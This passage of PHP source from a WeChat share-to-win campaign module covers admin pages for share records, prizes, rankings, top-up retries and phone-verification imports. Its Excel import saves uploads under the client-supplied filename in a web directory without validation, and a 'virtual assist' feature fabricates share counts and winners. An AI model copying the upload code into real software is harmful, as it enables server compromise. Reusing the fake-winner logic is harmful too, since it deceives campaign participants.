				'sharepoint' => $_GPC['point'],
                'visitorstime' => time()
            );
            pdo_insert('stonefish_redfunshare_sharedata', $insert);
			//添加中奖记录
            //设置此粉丝为虚拟中奖者
            pdo_update('stonefish_redfunshare_fans', array('sharenum' => $data['sharenum'] + 1,'xuni' => 1), array('id' => $data['id']));
			//设置此粉丝为虚拟中奖者
			message('添加虚拟助力量成功', url('site/entry/fansdata',array('rid' => $rid, 'm' => 'stonefish_redfunshare', 'page' => intval($_GPC['page']))));
		}else{
			message('未找到指定用户', url('site/entry/fansdata',array('rid' => $rid, 'm' => 'stonefish_redfunshare', 'page' => intval($_GPC['page']))), 'error');
		}       
    }
	//虚拟助力	
	//参与活动粉丝分享数据
	public function doWebSharedata() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$rid = empty($rid) ? intval($_GPC['id']) : $rid;
		$reply = pdo_fetch("select poweravatar,mobileverify,danwei from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		$params = array(':rid' => $rid, ':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['nickname'])) {
            $where.=' and nickname LIKE :nickname';
            $params[':nickname'] = "%{$_GPC['nickname']}%";
        }		
		if (!empty($_GPC['fromuser'])) {     
            $where.=' and fromuser=:fromuser';
            $params[':fromuser'] = $_GPC['fromuser'];
        }
		$total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_sharedata') . "  where rid = :rid and uniacid=:uniacid " . $where . "", $params);
		$psize = 20;
		$pagemax = ceil($total/$psize);
		$_GPC['page'] = $_GPC['page']>$pagemax ? $pagemax : $_GPC['page'];
        $pindex = max(1, intval($_GPC['page']));
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_sharedata') . " where rid = :rid and uniacid=:uniacid " . $where . " order by id desc " . $limit, $params);
		//分享人
		foreach ($list as &$lists) {
			$fans = pdo_fetch("select avatar,nickname,realname from " . tablename('stonefish_redfunshare_fans') . "  where rid = :rid and from_user=:from_user", array(':rid' => $rid,':from_user' => $lists['fromuser']));
			$lists['favatar'] =$fans['avatar'];
			$lists['fnickname'] =stripcslashes($fans['nickname']);
			$lists['frealname'] =$fans['realname'];
		}
		//分享人
        include $this->template('sharedata');
    }
	//参与活动粉丝分享数据
	//删除参与活动粉丝分享数据
	public function doWebDeletesharedata() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$reply = pdo_fetch("select * from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
        if(empty($reply)){
			echo json_encode(array('errno' => 1,'error' => '抱歉，传递的参数错误！'));
			exit;
        }
        foreach ($_GPC['idArr'] as $k => $id) {
            $id = intval($id);
            if($id == 0)
                continue;
			$sharedata = pdo_fetch("select id,fromuser from ".tablename('stonefish_redfunshare_sharedata')." where id = :id", array(':id' => $id));
            if(empty($sharedata)){
				echo json_encode(array('errno' => 1,'error' => '抱歉，选中的数据不存在！'));
				exit;
            }
			$fans = pdo_fetch("select * from " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid=:uniacid and from_user=:from_user", array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':from_user' => $sharedata['fromuser']));
			//减少参与粉丝分享助力
			pdo_update('stonefish_redfunshare_fans', array('sharenum' => $fans['sharenum']-1), array('id' => $fans['id']));
			//减少参与粉丝分享助力			
			//删除粉丝分享记录
			pdo_delete('stonefish_redfunshare_sharedata', array('id' => $sharedata['id']));
			//删除粉丝分享记录
        }
		echo json_encode(array('errno' => 0,'error' => '选中的分享数据删除成功！'));
		exit;
    }
	//删除参与活动粉丝分享数据
	//参与活动粉丝奖品数据
	public function doWebPrizedata() {
        global $_GPC, $_W;
		$rid = $_GPC['rid'];
		$rid = empty($rid) ? $_GPC['id'] : $rid;
		$reply = pdo_fetch("select poweravatar,mobileverify,danwei,redpacktype,seedredpack from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		$params = array(':rid' => $rid, ':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['nickname'])) {
			$sql_from_user = "SELECT GROUP_CONCAT(from_user) AS from_user_list FROM ".tablename('stonefish_redfunshare_fans')." WHERE rid = :rid and uniacid=:uniacid and nickname LIKE :nickname";
		    $from_user_list = pdo_fetchcolumn($sql_from_user, array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':nickname' => "%{$_GPC['nickname']}%"));
			if(!empty($from_user_list)){
				$from_user_list = str_replace(",","','",$from_user_list);
				$from_user_list = "'".$from_user_list."'";
				$where.=' and from_user in ('.$from_user_list.')';
			}
        }
		if (!empty($_GPC['realname'])) {     
			$sql_from_user = "SELECT GROUP_CONCAT(from_user) AS from_user_list FROM ".tablename('stonefish_redfunshare_fans')." WHERE rid = :rid and uniacid=:uniacid and realname LIKE :realname";
		    $from_user_list = pdo_fetchcolumn($sql_from_user, array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':realname' => "%{$_GPC['realname']}%"));
			if(!empty($from_user_list)){
				$from_user_list = str_replace(",","','",$from_user_list);
				$from_user_list = "'".$from_user_list."'";
				$where.=' and from_user in ('.$from_user_list.')';
			}
        }
		if (!empty($_GPC['mobile'])) {     
			$sql_from_user = "SELECT GROUP_CONCAT(from_user) AS from_user_list FROM ".tablename('stonefish_redfunshare_fans')." WHERE rid = :rid and uniacid=:uniacid and mobile LIKE :mobile";
		    $from_user_list = pdo_fetchcolumn($sql_from_user, array(':rid' => $rid, ':uniacid' => $_W['uniacid'], ':mobile' => "%{$_GPC['mobile']}%"));
			if(!empty($from_user_list)){
				$from_user_list = str_replace(",","','",$from_user_list);
				$from_user_list = "'".$from_user_list."'";
				$where.=' and from_user in ('.$from_user_list.')';
			}
        }
		//导出标题以及参数设置
		if($_GPC['zhongjiang']==''){
		    $statustitle = '全部';
			$where.=' and zhongjiang>=1';
		}
		if($_GPC['zhongjiang']==1){
		    $statustitle = '未兑换';
			$where.=' and zhongjiang=1';
		}
		if($_GPC['zhongjiang']==2){
		    $statustitle = '已兑换';
			$where.=' and zhongjiang>=2';
		}		
		if($_GPC['xuni']==1){
		    $statustitle .= '虚拟';
			$where.=' and xuni=1';
		}
		if($_GPC['xuni']=='2'){
		    $statustitle .= '真实';
			$where.=' and xuni=0';
		}		
		//导出标题以及参数设置				
		$total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fansaward') . " where rid = :rid and uniacid=:uniacid" . $where . "", $params);
        $psize = 20;
		$pagemax = ceil($total/$psize);
		$_GPC['page'] = $_GPC['page']>$pagemax ? $pagemax : $_GPC['page'];
        $pindex = max(1, intval($_GPC['page']));
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_fansaward') . " where rid = :rid and uniacid=:uniacid" . $where . " order by id desc " . $limit, $params);
		//奖品名称
		foreach ($list as &$lists) {
			$fans = pdo_fetch("select id, avatar, nickname, realname, mobile from " . tablename('stonefish_redfunshare_fans') . "  where from_user = :from_user", array(':from_user' =>$lists['from_user']));
			$lists['fid'] =$fans['id'];
			$lists['avatar'] =$fans['avatar'];
			$lists['nickname'] =$fans['nickname'];
			$lists['realname'] =$fans['realname'];
			$lists['mobile'] =$fans['mobile'];
			$lists['fanid'] = pdo_fetchcolumn("select fanid FROM ".tablename('mc_mapping_fans') ." where openid=:openid and uniacid=:uniacid",array(":openid"=>$lists['from_user'],":uniacid"=>$_W['uniacid']));
		}
		//奖品名称		
        include $this->template('prizedata');
    }
	//参与活动粉丝奖品数据
	//聚合订单查询
	public function doWebJuheinfo() {
        global $_GPC, $_W;
		if($_W['isajax']) {
		    $id = intval($_GPC['id']);
			$rid = intval($_GPC['rid']);
			$reply = pdo_fetch("select redpacktype,seedredpack from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
			$data = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fansaward')." where id = :id", array(':id' => $id));
			//话费订单
			if($reply['redpacktype']==1){
				//读取话费接口配置
				$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofpay' order by id desc");
				$appkey = $config['key']; 
				$openid = $config['sign'];
				$recharge = new recharge($appkey,$openid);
				//读取话费接口配置
				$orderid = $data['codesn']; //商家自定的订单号
				$orderStatusRes = $recharge->sta($orderid);
				if($orderStatusRes){
					if($orderStatusRes['error_code'] == '0'){
    				    if($orderStatusRes['result']['game_state'] =='0'){
        				    echo "充值中";
    				    }elseif($orderStatusRes['result']['game_state'] =='1'){
        				    echo "充值成功";
    				    }elseif($orderStatusRes['result']['game_state'] =='9'){
        				    echo "充值失败";
						    echo "[".$data['error_num']."]";
						    echo "<a href=".$this->createWebUrl('juhe_api',array('apitype'=>'mobileofpay', 'id'=>$data['id'])).">重新充值</a>";
    				    }elseif($orderStatusRes['result']['game_state'] =='-1'){
        				    echo "提交充值失败"; //可能是如运营商维护、账户余额不足等情况
						    echo "[".$data['error_num']."]";
						    echo "<a href=".$this->createWebUrl('juhe_api',array('apitype'=>'mobileofpay', 'id'=>$data['id'])).">重新充值</a>";
    				    }
				    }else{    				
    				    echo "查询失败:".$orderStatusRes['reason']."(".$orderStatusRes['error_code'].")";
				    }
				}else{
					echo "连接接口失败:";
				}				
			}
			//话费订单
			//流量订单
			if($reply['redpacktype']==2){
				//读取流量接口配置
				$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofflow' order by id desc");
				$appkey = $config['key']; 
				$openid = $config['sign'];
				$recharge = new recharge($appkey,$openid);
				//读取流量接口配置
				$orderid = $data['codesn']; //商家自定的订单号
				$orderStatusRes = $recharge->batchquery($orderid);
				if($orderStatusRes){
					if($orderStatusRes['error_code'] == '0'){
    				    if($orderStatusRes['result'][0]['game_state'] =='0'){
        				    echo "充值中";
    				    }elseif($orderStatusRes['result'][0]['game_state'] =='1'){
        				    echo "充值成功";
    				    }elseif($orderStatusRes['result'][0]['game_state'] =='9'){
        				    echo "充值失败";
						    echo "[".$data['error_num']."]";
						    echo "<a href=".$this->createWebUrl('juhe_api',array('apitype'=>'mobileofflow', 'id'=>$data['id'])).">重新充值</a>";
    				    }elseif($orderStatusRes['result'][0]['game_state'] =='-1'){
        				    echo "提交充值失败"; //可能是如运营商维护、账户余额不足等情况
						    echo "[".$data['error_num']."]";
						    echo "<a href=".$this->createWebUrl('juhe_api',array('apitype'=>'mobileofflow', 'id'=>$data['id'])).">重新充值</a>";
    				    }
				    }else{    				
    				    echo "查询失败:".$orderStatusRes['reason']."(".$orderStatusRes['error_code'].")";
				    }
				}else{
					echo "链接接口失败:";
				}				
			}
			//流量订单
		}
    }
	//聚合订单查询
	//重新充值juheapi接口（话费、流量）
	public function doWebJuhe_api(){
        global $_W, $_GPC;
        $id = intval($_GPC['id']);
		$data = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_fansaward') . " where id = :id", array(':id' => $id));
		$reply = pdo_fetch("select redpacktype,seedredpack from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $data['rid'], ':uniacid' => $_W['uniacid']));
		$codesn = date("YmdHis").mt_rand(1000,9999);
		//话费订单
		if($reply['redpacktype']==1){
			//读取话费接口配置
			$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofpay' order by id desc");
			$appkey = $config['key']; 
			$openid = $config['sign'];
			$recharge = new recharge($appkey,$openid);
			//读取话费接口配置
			$fans = pdo_fetch("select mobile,id FROM " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid = :uniacid and from_user = :from_user", array(':rid' => $data['rid'],':uniacid' => $data['uniacid'],':from_user' => $data['from_user']));
			//重新提交
			$procResult = $recharge->telcheck($fans['mobile'],intval($data['outpoint']));
			if(!$procResult){
				message('您的手机号不支持此面额充值');
			}else{
				$procResult = $recharge->telcz($fans['mobile'],intval($data['outpoint']),$codesn);
				if($procResult){
					if($procResult['error_code'] == "0"){
					    $consumetime = $data['consumetime'];
					    $rec['log']=$procResult['result']['sporder_id'];
					    $rec['zhongjiang']=2;
					    $rec['consumetime']=time();
					    $rec['completed']=1;
					    $rec['codesn']=$codesn;
					    $rec['ticketname']='聚合接口';
					    pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$id));
					    pdo_update('stonefish_redfunshare_fans', array('zhongjiang'=>2), array('id' => $fans['id']));
					    $text = '由于网络原因，您于'.date('Y/m/d H:i',$consumetime).'申请兑换的'.$data['outpoint'].'元话费红包终于充值成功,请咨询手机号：'.$fans['mobile'].' 的运营商客服或APP查询是否到账！';
					    $this->sendtext($text,$data['from_user']);
					    message('话费重新充值成功', $this->createWebUrl('prizedata',array('rid'=>$data['rid'])), 'success');
				    }else{
					    message($procResult['reason']);
				    }
				}else{
					 message('再次充值失败');
				}				
			}
			//重新提交
		}
		//话费订单
		//流量订单
		if($reply['redpacktype']==2){
			//重新提交
			//读取流量配置
			$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofflow' order by id desc");
			$appkey = $config['key']; 
			$openid = $config['sign'];
			$recharge = new recharge($appkey,$openid);
			//读取流量配置						
			$procResult = $recharge->flowcz($fans['mobile'],$data['completed'],$codesn);
			if($procResult){
				if($procResult['error_code']=='0'){
    			    $consumetime = $data['consumetime'];
				    $rec['log']=$procResult['result']['sporder_id'];
				    $rec['zhongjiang']=2;
				    $rec['consumetime']=time();
				    $rec['codesn']=$codesn;
				    $rec['ticketname']='聚合接口';
				    pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$id));
				    pdo_update('stonefish_redfunshare_fans', array('zhongjiang'=>2), array('id' => $fans['id']));
				    $text = '由于网络原因，您于'.date('Y/m/d H:i',$consumetime).'申请兑换的'.$data['outpoint'].'M流量红包终于充值成功,请咨询手机号：'.$fans['mobile'].' 的运营商客服或APP查询是否到账！';
				    $this->sendtext($text,$data['from_user']);
				    message('流量重新充值成功', $this->createWebUrl('prizedata',array('rid'=>$data['rid'])), 'success');
    		    }else{
				    message($procResult['reason']);
    		    }
			}else{
				message('系统接口出错');
			}    		
			//重新提交
		}
		//流量订单
    }
	//重新充值juheapi接口（话费、流量）
	//设置奖品兑换状态
	public function doWebSetprizestatus() {
        global $_GPC, $_W;
        $id = intval($_GPC['id']);
		$rid = intval($_GPC['rid']);
		$pid = intval($_GPC['pid']);
        $zhongjiang = intval($_GPC['zhongjiang']);
		if (empty($id)) {
            message('抱歉，传递的参数错误！', '', 'warning');
        }
        $p = array('zhongjiang' => $zhongjiang);
        if ($zhongjiang == 2) {
            $p['consumetime'] = TIMESTAMP;
			$p['ticketname'] = $_W['username'];
        }
        if ($zhongjiang == 1) {
            $p['consumetime'] = '0';
			$p['zhongjiang'] = 1;
			$p['ticketname'] = '';
        }
        $temp = pdo_update('stonefish_redfunshare_fansaward', $p, array('id' => $id));
        if ($temp == false) {
            message('抱歉，刚才操作数据失败！', '', 'warning');
        } else {
		    //修改用户状态
			$from_user = pdo_fetchcolumn("select from_user FROM " . tablename('stonefish_redfunshare_fansaward') . " where id = :id ORDER BY `id` DESC", array(':id' => $id));
			$yes = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_fansaward') ." where from_user=:from_user and uniacid=:uniacid and rid=:rid and zhongjiang=1",array(":from_user"=>$from_user,":uniacid"=>$_W['uniacid'],":rid"=>$rid));
			if(!empty($yes)){
				pdo_update('stonefish_redfunshare_fans', array('zhongjiang' => 1), array('rid' => $rid,'uniacid' => $_W['uniacid'],'from_user' => $from_user));
			}else{
				pdo_update('stonefish_redfunshare_fans', array('zhongjiang' => 2), array('rid' => $rid,'uniacid' => $_W['uniacid'],'from_user' => $from_user));
			}
			message('奖品兑换状态设置成功！', $this->createWebUrl('prizedata',array('rid'=>$_GPC['rid'], 'page' => intval($_GPC['page']))), 'success');
        }
    }
	//设置奖品兑换状态
	//删除中奖记录数据
	public function doWebDeleteprizedata() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$reply = pdo_fetch("select * from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		if(empty($reply)){
			echo json_encode(array('errno' => 1,'error' => '抱歉，传递的参数错误！'));
			exit;
        }
        foreach ($_GPC['idArr'] as $k => $id) {
            $id = intval($id);
            if($id == 0)
                continue;
			$fansaward = pdo_fetch("select from_user,outpoint from ".tablename('stonefish_redfunshare_fansaward')." where id = :id", array(':id' => $id));
			$from_user = $fansaward['from_user'];
			$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and  uniacid = :uniacid and  from_user = :from_user", array(':rid' => $rid,':uniacid'=>$_W['uniacid'],':from_user'=>$from_user));
            if(empty($fansaward)){
				echo json_encode(array('errno' => 1,'error' => '抱歉，选中的中奖数据不存在！'));
				exit;
            }
			//返换兑换的数量
			pdo_update('stonefish_redfunshare_fans', array('outpoint' => $fans['outpoint']-$fansaward['outpoint']), array('id' => $fans['id']));
			//返换兑换的数量
			//删除粉丝中奖记录
			pdo_delete('stonefish_redfunshare_fansaward', array('id' => $id));
			//删除粉丝中奖记录
			//查询此用户是否还有中奖记录并更新状态
			$yes = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_fansaward') ." where from_user=:from_user and uniacid=:uniacid and rid=:rid and zhongjiang>=1",array(":from_user"=>$from_user,":uniacid"=>$_W['uniacid'],":rid"=>$rid));
			if(empty($yes)){
				pdo_update('stonefish_redfunshare_fans', array('zhongjiang' => 0), array('rid' => $rid,'uniacid' => $_W['uniacid'],'from_user' => $from_user));
			}
			//查询此用户是否还有中奖记录并更新状态
        }
		echo json_encode(array('errno' => 0,'error' => '选中的中奖数据删除成功！'));
		exit;
    }
	//删除中奖记录数据
	//参与活动粉丝排行榜
	public function doWebRankdata() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$rid = empty($rid) ? intval($_GPC['id']) : $rid;
		$reply = pdo_fetch("select poweravatar,mobileverify,danwei from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		if(empty($_GPC['page'])){
			$_GPC['page']=1;
		}
		//默认排行榜
		if($reply['sharetype'] && empty($_GPC['rank'])){
			$_GPC['rank'] = 'share_num';
		}elseif(empty($_GPC['rank'])){
			$_GPC['rank'] = 'sharepoint';
		}
		//默认排行榜
		//导出标题以及参数设置
		if($_GPC['rank']=='sharepoint'){
		    $statustitle = '分享助力';
			$order = 'sharepoint';
		}
		if($_GPC['rank']=='share_num'){
		    $statustitle = '分享动作';
			$order = 'share_num';
		}
		//导出标题以及参数设置
		$params = array(':rid' => $rid, ':uniacid' => $_W['uniacid']);
		$total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fans') . "  where rid = :rid and uniacid=:uniacid " . $where . "", $params);
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid=:uniacid " . $where . " order by ".$order." desc,id asc " . $limit, $params);
        include $this->template('rankdata');
    }
	//参与活动粉丝排行榜
	//手机验证记录
	public function doWebmobileverify() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$rid = empty($rid) ? intval($_GPC['id']) : $rid;
		$reply = pdo_fetch("select poweravatar,mobileverify from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		$params = array(':rid' => $rid, ':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['mobile'])) {
            $where.=' and mobile=:mobile';
            $params[':mobile'] = $_GPC['mobile'];
        }
		if ($_GPC['verifytime']!='') {
            if ($_GPC['verifytime']==1) {
				$where.=' and verifytime>0';
			}else{
				$where.=' and verifytime=0';
			}
        }
		$total = pdo_fetchcolumn("select count(id) FROM " . tablename('stonefish_redfunshare_mobileverify') . "  where rid = :rid and uniacid=:uniacid ".$where."", $params);
        $psize = 20;
		$pagemax = ceil($total/$psize);
		$_GPC['page'] = $_GPC['page']>$pagemax ? $pagemax : $_GPC['page'];
        $pindex = max(1, intval($_GPC['page']));
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * FROM " . tablename('stonefish_redfunshare_mobileverify') . " where rid = :rid and uniacid=:uniacid ".$where." ORDER BY id DESC " . $limit, $params);
        include $this->template('mobileverify');
    }
	//手机验证记录
	//导入手机验证记录
	public function doWebMobileverifyImporting() {
        global $_GPC, $_W;
		if($_W['isajax']) {
		    $rid = intval($_GPC['rid']);
			$reply = pdo_fetch("select mobileverify from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
			include $this->template('mobileverifyimporting');
			exit();
		}
    }
	public function doWebMobileverifyimportingsave() {
        global $_GPC, $_W;		
		$rid = intval($_GPC['rid']);
		if(!$rid){
		    message('系统出错', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare')), 'error');
			exit;
		}
		if(empty($_FILES["inputExcel"]["tmp_name"])){
			message('系统出错', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare')), 'error');
			exit;
		}
		$inputFileName = '../addons/stonefish_redfunshare/template/moban/excel/'.$_FILES["inputExcel"]["name"];
		if (file_exists($inputFileName)){
            unlink($inputFileName);    //如果服务器上存在同名文件，则删除
		}
		move_uploaded_file($_FILES["inputExcel"]["tmp_name"],$inputFileName);
        require_once '../framework/library/phpexcel/PHPExcel.php';
        require_once '../framework/library/phpexcel/PHPExcel/IOFactory.php';
        require_once '../framework/library/phpexcel/PHPExcel/Reader/Excel5.php';			
		//设置php服务器可用内存，上传较大文件时可能会用到
		ini_set('memory_limit', '1024M');
		$objReader = PHPExcel_IOFactory::createReader('Excel5');//use excel2007 for 2007 format 
		$objPHPExcel = $objReader->load($inputFileName); 
		$sheet = $objPHPExcel->getSheet(0); 
		$highestRow = $sheet->getHighestRow();           //取得总行数 
		$highestColumn = $sheet->getHighestColumn(); //取得总列数
			
		$objWorksheet = $objPHPExcel->getActiveSheet();
        $highestRow = $objWorksheet->getHighestRow(); 

        $highestColumn = $objWorksheet->getHighestColumn();
        $highestColumnIndex = PHPExcel_Cell::columnIndexFromString($highestColumn);//总列数
            
        $headtitle=array(); 
        for ($row = 2;$row <= $highestRow;$row++){
            $strs=array();
            //注意highestColumnIndex的列数索引从0开始
            for ($col = 0;$col < $highestColumnIndex;$col++){
                $strs[$col] =$objWorksheet->getCellByColumnAndRow($col, $row)->getValue();
            }
            //插入数据
			$chongfu = pdo_fetch("select id FROM ".tablename('stonefish_redfunshare_mobileverify')." where mobile =:mobile and uniacid=:uniacid and rid=:rid", array(':mobile' => $strs[0],':uniacid' => $_W['uniacid'],':rid' => $rid));
			$data = array(
					'uniacid' => $_W['uniacid'],
					'rid' => $rid,
					'realname' => $strs[0],
					'mobile' => $strs[1],
					'welfare' => $strs[2],
					'status' => 2,
					'createtime' => time()
			);
			if (!empty($chongfu)){
				pdo_update('stonefish_redfunshare_mobileverify', $data, array('id' => $chongfu['id']));
			}else{
				pdo_insert('stonefish_redfunshare_mobileverify', $data);
			}
        }
        unlink($inputFileName); //删除上传的excel文件
        message('导入手机验证成功', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare')));
		exit;    
    }
	//导入手机验证记录
	//修改手机验证记录
	public function doWebAddmobileverify() {
        global $_GPC, $_W;
		if($_W['isajax']) {
			$rid = intval($_GPC['rid']);
			$op = 'add';
			$reply = pdo_fetch("select mobileverify FROM ".tablename('stonefish_redfunshare_reply')." where rid = :rid", array(':rid' => $rid));
			$data['status'] =2;
			include $this->template('mobileverifyedit');
			exit();
		}
    }
	public function doWebEditmobileverify() {
        global $_GPC, $_W;
		if($_W['isajax']) {
			$uid = intval($_GPC['uid']);
			$rid = intval($_GPC['rid']);
			$reply = pdo_fetch("select mobileverify FROM ".tablename('stonefish_redfunshare_reply')." where rid = :rid", array(':rid' => $rid));
			$data = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_mobileverify') . ' where id = :id AND uniacid = :uniacid', array(':uniacid' => $_W['uniacid'], ':id' => $uid));
			include $this->template('mobileverifyedit');
			exit();
		}
    }
	public function doWebEditmobileverifysave() {
        global $_GPC, $_W;
		$uid = intval($_GPC['uid']);
		$rid = intval($_GPC['rid']);
		$status = intval($_GPC['status']);
		$op = $_GPC['op'];
		if(!$rid){
		    message('系统出错', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page' => intval($_GPC['page']))), 'error');
		}
		$reply = pdo_fetch("select mobileverify FROM ".tablename('stonefish_redfunshare_reply')." where rid = :rid", array(':rid' => $rid));
		if (empty($_GPC['mobile'])){
			message('必需输入手机号', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page' => intval($_GPC['page']))), 'error');
		}
		if($uid && empty($op)) {
		    //次数
			$chongfu = pdo_fetch("select id FROM ".tablename('stonefish_redfunshare_mobileverify')." where mobile =:mobile and uniacid=:uniacid and rid=:rid and id<>:id", array(':mobile' => $_GPC['mobile'],':uniacid' => $_W['uniacid'],':rid' => $rid,':id' => $uid));
			if (empty($chongfu)){
				pdo_update('stonefish_redfunshare_mobileverify', array('realname' => $_GPC['realname'],'mobile' => $_GPC['mobile'],'status' => $status,'welfare' => $_GPC['welfare']), array('id' => $uid));				
			    message('修改手机验证成功', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page' => intval($_GPC['page']))));
			}else{
				message('此手机号已存在', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page' => intval($_GPC['page']))), 'error');
			}
		}else{
			if(!empty($op)){
				$chongfu = pdo_fetch("select id FROM ".tablename('stonefish_redfunshare_mobileverify')." where mobile =:mobile and uniacid=:uniacid and rid=:rid", array(':mobile' => $_GPC['mobile'],':uniacid' => $_W['uniacid'],':rid' => $rid));
			    if (empty($chongfu)){
					$data = array(
					    'uniacid' => $_W['uniacid'],
					    'rid' => $rid,
					    'realname' => $_GPC['realname'],
					    'mobile' => $_GPC['mobile'],
					    'status' => $status,
						'welfare' => $_GPC['welfare'],
					    'createtime' => time()
			        );					
					pdo_insert('stonefish_redfunshare_mobileverify', $data);
			        message('添加手机验证成功', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page' => intval($_GPC['page']))));
			    }else{
				    message('此手机号已存在', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page' => intval($_GPC['page']))), 'error');
			    }
			}else{
				message('未找到指定用户', url('site/entry/mobileverify',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page' => intval($_GPC['page']))), 'error');
			}
		}
    }
	//修改手机验证记录
	//手机验证记录状态
	public function doWebSetmobileverifycheck() {
        global $_GPC, $_W;
        $id = intval($_GPC['id']);
        $type = $_GPC['type'];
        $data = intval($_GPC['data']);
        if (in_array($type, array('status'))) {
            $data = ($data==2?'1':'2');
            pdo_update("stonefish_redfunshare_mobileverify", array("status" => $data), array("id" => $id, "uniacid" => $_W['uniacid']));
            die(json_encode(array("result" => 1, "data" => $data)));
        }
        die(json_encode(array("result" => 0)));
    }
	//手机验证记录状态
	//删除手机验证记录
	public function doWebDeletemobileverify() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$reply = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_reply')." where rid = :rid", array(':rid' => $rid));
        if (empty($reply)) {
			echo json_encode(array('errno' => 1,'error' => '抱歉，要修改的活动不存在或是已经被删除！'));
			exit;
        }
        foreach ($_GPC['idArr'] as $k => $id) {
